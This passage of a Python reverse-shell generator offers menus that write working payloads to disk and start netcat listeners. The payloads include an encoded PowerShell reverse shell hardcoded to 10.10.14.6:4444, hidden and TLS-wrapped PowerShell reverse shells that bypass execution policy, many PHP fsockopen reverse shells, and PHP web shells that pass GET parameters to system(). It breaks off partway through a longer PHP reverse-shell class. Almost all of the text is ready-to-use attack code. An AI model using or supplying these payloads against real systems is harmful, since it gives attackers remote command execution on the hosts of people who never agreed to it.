		command = f"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	powershell_menu()


def generate_powershell_4_tls():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {lport});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{ $true }} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close();exit }}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush() }};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }}WriteToStream ($Output) }}$StreamWriter.Close()" """

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	powershell_menu()


def generate_powershell_3():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {lport});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()" """

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	powershell_menu()



def generate_powershell_2():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	powershell_menu()


def generate_powershell_1():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""
        $LHOST = "{lhost}"; $LPORT = {lport}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
        """

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	powershell_menu()


def php_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate PHP shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. PHP PentestMonkey" + Style.RESET_ALL)
		print(Fore.BLUE + "2. PHP Ivan Sincek" + Style.RESET_ALL)
		print(Fore.BLUE + "3. PHP cmd" + Style.RESET_ALL)
		print(Fore.BLUE + "4. PHP cmd2" + Style.RESET_ALL)
		print(Fore.BLUE + "5. PHP cmd small" + Style.RESET_ALL)
		print(Fore.BLUE + "6. PHP exec" + Style.RESET_ALL)
		print(Fore.BLUE + "7. PHP shell_exec" + Style.RESET_ALL)
		print(Fore.BLUE + "8. PHP system" + Style.RESET_ALL)
		print(Fore.BLUE + "9. PHP passthru" + Style.RESET_ALL)
		print(Fore.BLUE + "10. PHP`" + Style.RESET_ALL)
		print(Fore.BLUE + "11. PHP popen" + Style.RESET_ALL)
		print(Fore.BLUE + "12. PHP proc_open" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-12): ")

		if choice == "1":
			generate_php_pentestmonkey()
		elif choice == "2":
			generate_php_ivan_sincek()
		elif choice == "3":
			generate_php_cmd()
		elif choice == "4":
			generate_php_cmd_2()
		elif choice == "5":
			generate_php_cmd_small()
		elif choice == "6":
			generate_php_exec()
		elif choice == "7":
			generate_php_shell_exec()
		elif choice == "8":
			generate_php_system()
		elif choice == "9":
			generate_php_passthru()
		elif choice == "10":
			generate_php_10()
		elif choice == "11":
			generate_php_popen()
		elif choice == "12":
			generate_php_proc_open()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()
	


def generate_php_proc_open():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()



def generate_php_popen():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});popen("sh <&3 >&3 2>&3", "r");'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()



def generate_php_10():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});`sh <&3 >&3 2>&3`;'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()




def generate_php_passthru():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});passthru("sh <&3 >&3 2>&3");'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()




def generate_php_system():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});system("sh <&3 >&3 2>&3");'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()




def generate_php_shell_exec():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("sh <&3 >&3 2>&3");'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()




def generate_php_exec():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("sh <&3 >&3 2>&3");'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()



def generate_php_cmd_small():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"<?=`$_GET[0]`?>"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()


def generate_php_cmd_2():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }}?>"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()



def generate_php_cmd():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {{
        system($_GET['cmd']);
    }}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()


def generate_php_ivan_sincek():
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {{
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {{
        $this->addr = $addr;
        $this->port = $port;
    }}
    private function detect() {{
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) {{ // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
